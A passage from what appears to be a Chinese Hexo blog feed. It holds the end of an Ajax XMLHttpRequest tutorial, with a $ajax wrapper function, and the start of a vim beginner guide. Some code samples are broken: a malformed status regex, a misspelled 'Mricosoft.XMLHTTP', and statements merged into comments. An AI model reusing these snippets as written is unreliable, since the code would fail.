对象的⽅法去发送请求和接受响应</li><li>Ajax的一个最大的特点是<em>无需刷新页面便可向服务器传输或读写数据</em>(又称无刷新更新页面),这一特点主要得益于XMLHTTP组件XMLHTTPRequest对象。</li></ul><blockquote><p>XMLHttpRequest 对象方法描述</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200315104357831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L09yaWVudGFsXw==,size_16,color_FFFFFF,t_70" alt="对象方法描述"></p><h2 id="4-1创建⼀个-ajax-对象"><a href="#4-1创建⼀个-ajax-对象" class="headerlink" title="4.1创建⼀个 ajax 对象"></a>4.1创建⼀个 ajax 对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IE9及以上</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="comment">// IE9以下</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;Mricosoft.XMLHTTP&#x27;</span>)</span><br></pre></td></tr></table></figure><p>上⾯就有了⼀个 ajax 对象<br>我们就可以使⽤这个<strong>xhr</strong>对象来发送 ajax 请求了</p><h2 id="4-2-配置链接信息"><a href="#4-2-配置链接信息" class="headerlink" title="4.2.配置链接信息"></a>4.2.配置链接信息</h2><p>XMLHttpRequest 对象属性描述   (<em>用于和服务器交换数据</em>)<br><img src="https://img-blog.csdnimg.cn/20200315103859777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L09yaWVudGFsXw==,size_16,color_FFFFFF,t_70" alt="配置链接信息"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均内建 XMLHttpRequest 对象。</span></span><br><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="comment">// xhr 对象中的 open ⽅法是来配置请求信息的</span></span><br><span class="line"><span class="comment">// 第⼀个参数是本次请求的请求⽅式 get / post / put / ...</span></span><br><span class="line"><span class="comment">// 第⼆个参数是本次请求的 url </span></span><br><span class="line"><span class="comment">// 第三个参数是本次请求是否异步，默认 true 表示异步，false 表示同步</span></span><br><span class="line"><span class="comment">// xhr.open(&#x27;请求⽅式&#x27;, &#x27;请求地址&#x27;, 是否异步)</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./data.php&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上⾯的代码执⾏完毕以后，本次请求的基本配置信息就写完了</p><h2 id="4-3发送请求"><a href="#4-3发送请求" class="headerlink" title="4.3发送请求"></a>4.3发送请求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//如需将请求发送到服务器，我们使用 XMLHttpRequest 对象的 open() 和 send() 方法：</span><br><span class="line">const xhr = new XMLHttpRequest()</span><br><span class="line">xhr.open(&#x27;get&#x27;, &#x27;./data.php&#x27;)</span><br><span class="line">// 使⽤ xhr 对象中的 send ⽅法来发送请求</span><br><span class="line">xhr.send()</span><br></pre></td></tr></table></figure><p>上面代码是把配置好信息的 ajax 对象发送到服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一个最基本的 ajax 请求就是上面三步 但是光有上面的三个步骤，我们确实能把请求发送到服务端 </span><br><span class="line">如果服务端正常的话，响应也能回到客户端 但是我们拿不到响应</span><br><span class="line">如果想要拿到响应，我们需要有两个前提条件</span><br><span class="line">1. 本次 HTTP 请求是成功的，也就是我们下面要说的 http 状态码为 200 ~ 299</span><br><span class="line">2. ajax 对象也有自己的状态码，用来表示本次 ajax 请求中各个阶段</span><br></pre></td></tr></table></figure><h1 id="5-Ajax状态码"><a href="#5-Ajax状态码" class="headerlink" title="5.Ajax状态码"></a>5.Ajax状态码</h1><ul><li>ajax 状态码 - xhr.readyState</li><li>是用来表示一个 ajax 请求的全部过程中的某一个状态<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">readyState === 0 : 表示未初始化完成，也就是 open 方法还没有执行 </span><br><span class="line">readyState === 1 : 表示配置信息已经完成，也就是执行完 open 之后 </span><br><span class="line">readyState === 2 : 表示 send 方法已经执行完成</span><br><span class="line">readyState === 3 : 表示正在解析响应内容</span><br><span class="line">readyState === 4 : 表示响应内容已经解析完毕，可以在客户端使用了</span><br></pre></td></tr></table></figure></li><li>这个时候我们就会发现，当一个 ajax 请求的全部过程中，只有当 <em>readyState &#x3D;&#x3D;&#x3D; 4</em> 的时候，我们才可以正常使用服务端给我们的数据</li><li>所以，配合 http 状态码为 200 ~ 299<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个 ajax 对象中有一个成员叫做 xhr.status</span><br><span class="line">这个成员就是记录本次请求的 http 状态码的 </span><br></pre></td></tr></table></figure></li><li>两个条件都满足的时候，才是本次请求正常完成</li></ul><h1 id="readyStateChange"><a href="#readyStateChange" class="headerlink" title="readyStateChange"></a>readyStateChange</h1><ul><li>在 ajax 对象中有一个事件，叫做 readyStateChange 事件</li><li>这个事件是专⻔用来监听 ajax 对象的 readyState 值改变的的行为</li><li>也就是说只要 readyState 的值发生变化了，那么就会触发该事件</li><li>所以我们就在这个事件中来监听 ajax 的 readyState 是不是到 4 了</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>() xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./data.php&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line">xhr.<span class="property">onreadyStateChange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 每次 readyState 改变的时候都会触发该事件</span></span><br><span class="line"><span class="comment">// 我们就在这里判断 readyState 的值是不是到 4</span></span><br><span class="line"><span class="comment">// 并且 http 的状态码是不是 200 ~ 299</span></span><br><span class="line"><span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; <span class="regexp">/^2\d&#123;2|$/</span>.<span class="title function_">test</span>(xhr.<span class="property">status</span>)) &#123;</span><br><span class="line"><span class="comment">// 这里表示验证通过</span></span><br><span class="line"><span class="comment">// 我们就可以获取服务端给我们响应的内容了 &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="使用-ajax-发送请求时携带参数"><a href="#使用-ajax-发送请求时携带参数" class="headerlink" title="使用 ajax 发送请求时携带参数"></a>使用 ajax 发送请求时携带参数</h1><ul><li>我们使用 ajax 发送请求也是可以携带参数的</li><li>参数就是和后台交互的时候给他的一些信息</li><li>但是携带参数get 和 post两个方式还是有区别的</li></ul><blockquote><p>GET 还是 POST？</p></blockquote><ul><li><p>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。</p></li><li><p>然而，在以下情况中，请使用 POST 请求：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">无法使用缓存文件（更新服务器上的文件或数据库）</span><br><span class="line">向服务器发送大量数据（POST 没有数据量限制）</span><br><span class="line">发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</span><br></pre></td></tr></table></figure><blockquote><p>发送一个带有参数的 get 请求</p></blockquote></li><li><p>get 请求的参数就<strong>直接在 url 后面进行拼接就可以</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="comment">// 直接在地址后面加一个 ?，然后以 key=value 的形式传递 // 两个数据之间以 &amp; 分割</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./data.php?a=100&amp;b=200&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样服务端就能接受到两个参数 一个是 a，值是 100，一个是 b，值是 200</p></li></ul><blockquote><p>发送一个带有参数的 post 请求</p></blockquote><ul><li>post 请求的参数是携带在请求体中的，所以<strong>不需要再 url 后面拼接</strong></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>() xhr.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;./data.php&#x27;</span>)</span><br><span class="line"><span class="comment">// 如果是用 ajax 对象发送 post 请求，必须要先设置一下请求头中的 content- type</span></span><br><span class="line"><span class="comment">// 告诉一下服务端我给你的是一个什么样子的数据格式 xhr.setRequestHeader(&#x27;content-type&#x27;, &#x27;application/x-www-form- urlencoded&#x27;)</span></span><br><span class="line"><span class="comment">// 请求体直接再 send 的时候写在 () 里面就行</span></span><br><span class="line"><span class="comment">// 不需要问号，直接就是 &#x27;key=value&amp;key=value&#x27; 的形式 xhr.send(&#x27;a=100&amp;b=200&#x27;)</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建 ajax 对象</span></span><br><span class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="comment">// 2. 配置请求信息 xhr.open(‘GET’, ‘./test.php’, true)</span></span><br><span class="line"><span class="comment">// 3. 发送请求 xhr.send()</span></span><br><span class="line"><span class="comment">// 4. 接受响应 xhr.onload = function () &#123;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>) &#125;</span><br></pre></td></tr></table></figure><h1 id="6-Ajax封装"><a href="#6-Ajax封装" class="headerlink" title="6.Ajax封装"></a>6.Ajax封装</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                type 代表 请求方式</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                url  代表 请求url路径</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                data 代表 发送数据</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                success 代表 下载数据成功以后执行的函数</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                error   代表 下载数据失败以后执行的函数</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            */</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">$ajax</span>(<span class="params">&#123;type = <span class="string">&quot;get&quot;</span>, url, data, success, error&#125;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> xhr = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">catch</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">                    xhr = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(type == <span class="string">&quot;get&quot;</span> &amp;&amp; data)&#123;</span></span><br><span class="line"><span class="language-javascript">                    url += <span class="string">&quot;?&quot;</span> + <span class="title function_">querystring</span>(data);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="title function_">open</span>(type, url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(type == <span class="string">&quot;get&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                     <span class="comment">//设置提交数据格式</span></span></span><br><span class="line"><span class="language-javascript">                    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    data ? xhr.<span class="title function_">send</span>(<span class="title function_">querystring</span>(data)) : xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">if</span>(xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span>(success)&#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="title function_">success</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">if</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="title function_">error</span>(<span class="string">&quot;Error：&quot;</span> + xhr.<span class="property">status</span>);</span></span><br><span class="line"><span class="language-javascript">                            &#125;</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">querystring</span>(<span class="params">obj</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> attr <span class="keyword">in</span> obj)&#123;</span></span><br><span class="line"><span class="language-javascript">                    str += attr + <span class="string">&quot;=&quot;</span> + obj[attr] + <span class="string">&quot;&amp;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> str.<span class="title function_">substring</span>(<span class="number">0</span>, str.<span class="property">length</span> - <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> aBtns = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;button&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                    当我们下载完数据以后需要对数据的处理方式不一样</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                    【注】$ajax，我们需要按照传参的顺序，依次传入我们的参数。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                aBtns[<span class="number">0</span>].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    $ajax(&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">url</span>: <span class="string">&quot;code14/1.get.php&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">username</span>: <span class="string">&quot;小明&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">age</span>: <span class="number">18</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">password</span>: <span class="string">&quot;123abc&quot;</span></span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">result</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">alert</span>(<span class="string">&quot;GET请求到的数据：&quot;</span> + result);</span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">alert</span>(<span class="string">&quot;GET请求数据错误：&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                aBtns[<span class="number">1</span>].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    $ajax(&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">url</span>: <span class="string">&quot;code14/2.post.php&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">username</span>: <span class="string">&quot;小花&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">age</span>: <span class="number">18</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">password</span>: <span class="string">&quot;123abc&quot;</span></span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">result</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">alert</span>(<span class="string">&quot;POST请求到的数据：&quot;</span> + result);</span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">alert</span>(<span class="string">&quot;POST请求数据错误：&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>GET请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>POST请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结:以上就是前后端交互工具AJAX的重点内容</p><p>原文链接：<a href="https://blog.csdn.net/Oriental_/article/details/104863762">https://blog.csdn.net/Oriental_/article/details/104863762</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim入门</title>
      <link href="/post/4571b888.html"/>
      <url>/post/4571b888.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-使用hjkl来移动你的光标"><a href="#1-使用hjkl来移动你的光标" class="headerlink" title="1.使用hjkl来移动你的光标"></a>1.使用hjkl来移动你的光标</h1><pre><code>h:向左移动j:向下移动K:向上移动l:向右移动</code></pre><h1 id="2-插入模式和退出vim的方法"><a href="#2-插入模式和退出vim的方法" class="headerlink" title="2.插入模式和退出vim的方法"></a>2.插入模式和退出vim的方法</h1><h2 id="2-1插入模式"><a href="#2-1插入模式" class="headerlink" title="2.1插入模式"></a>2.1插入模式</h2><p>  敲击i键，发现左下角有个–INSERT–，进入插入模式</p><p>  敲击Esc，退出插入模式</p><h2 id="2-2退出vim"><a href="#2-2退出vim" class="headerlink" title="2.2退出vim"></a>2.2退出vim</h2><p>  不保存修改，强制退出，输入 :q!</p><p>  保存修改，再退出，按下：shift+Z+Z;或者 :wq</p><h1 id="3-删除命令、数字的奥义、撤销和恢复命令"><a href="#3-删除命令、数字的奥义、撤销和恢复命令" class="headerlink" title="3.删除命令、数字的奥义、撤销和恢复命令"></a>3.删除命令、数字的奥义、撤销和恢复命令</h1><h2 id="3-1删除命令"><a href="#3-1删除命令" class="headerlink" title="3.1删除命令"></a>3.1删除命令</h2><p>  在普通模式（非插入模式下），小写x可删除光标所在位置的字符</p><pre><code>motion:0/^：光标去到行首$：光标去到行尾gg：光标去到段首G：光标去到段尾</code></pre><h2 id="3-2数字的奥义"><a href="#3-2数字的奥义" class="headerlink" title="3.2数字的奥义"></a>3.2数字的奥义</h2><pre><code>·数字+motion = 重复多个motion·d + 数字 + motion = 删除多个motion范围</code></pre><h2 id="3-3撤销和恢复"><a href="#3-3撤销和恢复" class="headerlink" title="3.3撤销和恢复"></a>3.3撤销和恢复</h2><pre><code>·u 表示撤销最后一次修改·U 表示撤销对整行的修改·Ctrl + r快捷键可以修复撤销的内容</code></pre><h1 id="4-粘贴拷贝、替换命令、替换模式和修改命令"><a href="#4-粘贴拷贝、替换命令、替换模式和修改命令" class="headerlink" title="4.粘贴拷贝、替换命令、替换模式和修改命令"></a>4.粘贴拷贝、替换命令、替换模式和修改命令</h1><h2 id="4-1粘贴-amp-拷贝"><a href="#4-1粘贴-amp-拷贝" class="headerlink" title="4.1粘贴&amp;拷贝"></a>4.1粘贴&amp;拷贝</h2><h3 id="4-1-1粘贴"><a href="#4-1-1粘贴" class="headerlink" title="4.1.1粘贴"></a>4.1.1粘贴</h3><pre><code>使用p命令可以将最后一次删除的内容粘贴到光标之后·注意: 如果你粘贴的内容以整行为单位，那么p命令将在光标的下一行开始粘贴；      如果你粘贴的内容是非整行的局部字符串，那么p命令将在光标后开始粘贴</code></pre><h3 id="4-1-2拷贝"><a href="#4-1-2拷贝" class="headerlink" title="4.1.2拷贝"></a>4.1.2拷贝</h3><pre><code>使用y命令可以实现拷贝：y[数字] motione.g. y+$:从光标当前的位置拷贝到行尾</code></pre><h2 id="4-2替换命令"><a href="#4-2替换命令" class="headerlink" title="4.2替换命令"></a>4.2替换命令</h2><ul><li>r命令用于替换光标所在的字符，做法是先将光标移动到需要替换的字符处，按一下r键，然后输入新的字符</li><li>按R整体进入替换模式</li></ul><p>##4.3修改模式<br>【修改和替换模式是不一样的】</p><pre><code>使用c命令可以实现修改：c[数字] motion</code></pre><p>修改 &#x3D;&#x3D; 删除 + 进入插入模式</p><h1 id="5-文件信息、跳转和定位括号"><a href="#5-文件信息、跳转和定位括号" class="headerlink" title="5.文件信息、跳转和定位括号"></a>5.文件信息、跳转和定位括号</h1><h2 id="5-1跳转"><a href="#5-1跳转" class="headerlink" title="5.1跳转"></a>5.1跳转</h2><p>  行号+G  &#x2F; :+行号</p><h2 id="5-2定位括号"><a href="#5-2定位括号" class="headerlink" title="5.2定位括号"></a>5.2定位括号</h2><p>  按下%键，能迅速找到括号的另一半</p><h1 id="6-搜索命令和替换命令"><a href="#6-搜索命令和替换命令" class="headerlink" title="6.搜索命令和替换命令"></a>6.搜索命令和替换命令</h1><h2 id="6-1搜索命令"><a href="#6-1搜索命令" class="headerlink" title="6.1搜索命令"></a>6.1搜索命令</h2><p>vim的搜索是从按下&#x2F;开始的<br><img src="/img/%E6%90%9C%E7%B4%A2%E5%91%BD%E4%BB%A4.jpg" alt="搜索命令"></p><p>:nohl 可以解除全部的高亮</p><p>搜索带有特殊意义的字符如“.”，得再加一个反斜杠，如“&#x2F;.“</p><h2 id="6-2替换命令"><a href="#6-2替换命令" class="headerlink" title="6.2替换命令"></a>6.2替换命令</h2><p><img 